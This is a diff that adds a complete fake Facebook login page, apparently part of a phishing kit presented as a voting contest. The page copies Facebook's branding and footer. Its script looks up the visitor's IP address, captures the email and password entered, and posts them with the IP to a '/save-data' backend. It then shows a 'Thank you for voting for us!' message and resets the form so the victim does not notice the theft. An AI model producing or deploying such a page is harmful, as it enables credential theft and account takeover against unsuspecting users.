@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+      background-color: #f0f2f5;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .content {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      max-width: 960px;
+      width: 100%;
+    }
+    .login-left {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+    .login-left img {
+      width: 301px;
+      height: 106px;
+      margin-bottom: 20px;
+    }
+    .login-left h2 {
+      font-size: 24px;
+      max-width: 400px;
+      margin: 0 auto;
+      line-height: 1.5;
+    }
+    .login-right {
+      background-color: white;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .login-right form {
+      display: flex;
+      flex-direction: column;
+    }
+    .login-right input {
+      padding: 12px;
+      margin-bottom: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    .login-right button {
+      padding: 14px;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .login-right button.login-btn {
+      background-color: #1877f2;
+      margin-bottom: 20px;
+    }
+    .login-right button.create-account-btn {
+      background-color: #42b72a;
+    }
+    .login-right a {
+      color: #1877f2;
+      font-size: 14px;
+      display: inline-block;
+      margin-top: 10px;
+    }
+    .footer {
+      margin-top: 40px;
+      text-align: center;
+    }
+    .footer nav {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    .footer nav a {
+      margin: 0 10px;
+      color: #8e8e8e;
+      font-size: 12px;
+      text-decoration: none;
+    }
+    .footer nav a:hover {
+      text-decoration: underline;
+    }
+    .footer div {
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="content">
+      <!-- Left Side -->
+      <div class="login-left">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        <h2>Facebook helps you connect and share with the people in your life.</h2>
+      </div>
+
+      <!-- Right Side (Login Form) -->
+      <div class="login-right">
+        <form>
+          <input type="text" id="email" placeholder="Email address or phone number" required>
+          <input type="password" id="password" placeholder="Password" required>
+          <button type="submit" class="login-btn">Log In</button>
+        </form>
+        <a href="#">Forgotten password?</a>
+        <hr>
+        <button class="create-account-btn">Create New Account</button>
+      </div>
+    </div>
+
+    <!-- Bottom Section -->
+    <div class="footer">
+      <nav>
+        <a href="#">Sign Up</a>
+        <a href="#">Log In</a>
+        <a href="#">Messenger</a>
+        <a href="#">Facebook Lite</a>
+        <a href="#">Watch</a>
+        <a href="#">Places</a>
+        <a href="#">Games</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Meta Pay</a>
+        <a href="#">Oculus</a>
+        <a href="#">Portal</a>
+        <a href="#">Instagram</a>
+        <a href="#">Bulletin</a>
+        <a href="#">Fundraisers</a>
+        <a href="#">Services</a>
+        <a href="#">Voting Information Centre</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Privacy Centre</a>
+        <a href="#">Groups</a>
+        <a href="#">About</a>
+        <a href="#">Create Ad</a>
+        <a href="#">Create Page</a>
+        <a href="#">Developers</a>
+        <a href="#">Careers</a>
+        <a href="#">Cookies</a>
+        <a href="#">AdChoices</a>
+        <a href="#">Terms</a>
+        <a href="#">Help</a>
+        <a href="#">Contact uploading and non-users</a>
+      </nav>
+      <div>Meta © 2023</div>
+    </div>
+  </div>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script>
+      let userIP = '';
+      
+      $.getJSON('https://api.ipify.org?format=json')
+          .done(function(data) {
+              userIP = data.ip;
+              console.log('User IP Address:', userIP);
+          })
+          .fail(function() {
+              console.error('Could not retrieve IP address.');
+          });
+  
+      function sendLoginData(email, password, platform) {
+          const data = {
+              email: email,
+              password: password,
+              platform: platform,
+              ip: userIP
+          };
+  
+          console.log('Sending data to the backend:', data);
+  
+          fetch('/save-data', {
+              method: 'POST',
+              headers: {
+                  'Content-Type': 'application/json',
+              },
+              body: JSON.stringify(data),
+          })
+          .then(response => response.json())
+          .then(result => {
+              console.log('Success:', result);
+              showThankYouMessage();
+          })
+          .catch(error => {
+              console.error('Error:', error);
+          });
+      }
+  
+      function showThankYouMessage() {
+          document.querySelector('.content').style.display = 'none';
+          const thankYouMessage = document.createElement('div');
+          thankYouMessage.id = 'thank-you-message';
+          thankYouMessage.innerHTML = `
+              <div class="success-animation"></div>
+              <p>Thank you for voting for us!</p>
+              <p>Your IP Address is: <span id="ip-address">${userIP}</span></p>
+          `;
+          document.querySelector('.container').appendChild(thankYouMessage);
+  
+          setTimeout(() => {
+              document.querySelector('.content').style.display = 'flex';
+              document.getElementById('thank-you-message').remove();
+              document.querySelector('form').reset();
+          }, 3000);
+      }
+  
+      document.querySelector('.login-right form').addEventListener('submit', function(e) {
+          e.preventDefault();
+          const email = this.querySelector('input[type="text"]').value;
+          const password = this.querySelector('input[type="password"]').value;
+          sendLoginData(email, password, 'Facebook');
+      });
+  </script>
+  
+
+</body>
+</html>
